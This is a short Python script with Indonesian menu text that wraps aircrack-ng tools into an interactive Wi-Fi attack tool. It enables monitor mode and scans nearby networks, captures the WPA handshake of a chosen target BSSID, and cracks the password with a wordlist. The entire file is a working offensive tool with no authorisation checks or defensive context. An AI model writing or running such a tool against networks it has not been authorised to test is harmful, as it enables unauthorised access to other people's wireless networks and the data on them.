import subprocess

def scan_networks(interface):
    subprocess.run(["sudo", "airmon-ng", "start", interface])
    subprocess.run(["sudo", "airodump-ng", "mon0"])

def capture_handshake(bssid, channel, output_file):
    subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", output_file, "mon0"])

def crack_handshake(cap_file, wordlist):
    subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, cap_file])

def display_menu():
    print("Pilih opsi:")
    print("1. Scan Networks")
    print("2. Capture Handshake")
    print("3. Crack Handshake")
    print("4. Keluar")

def main():
    wifi_interface = input("Masukkan nama antarmuka Wi-Fi: ")

    while True:
        display_menu()

        choice = input("Pilihan Anda: ")

        if choice == "1":
            scan_networks(wifi_interface)
        elif choice == "2":
            target_bssid = input("Masukkan BSSID target: ")
            target_channel = input("Masukkan saluran target: ")
            handshake_output = input("Masukkan nama file output handshake (.cap): ")
            capture_handshake(target_bssid, target_channel, handshake_output)
        elif choice == "3":
            handshake_output = input("Masukkan nama file handshake (.cap): ")
            wordlist_file = input("Masukkan nama file wordlist: ")
            crack_handshake(handshake_output, wordlist_file)
        elif choice == "4":
            break
        else:
            print("Pilihan tidak valid. Silakan coba lagi.")

if __name__ == "__main__":
    main()
    
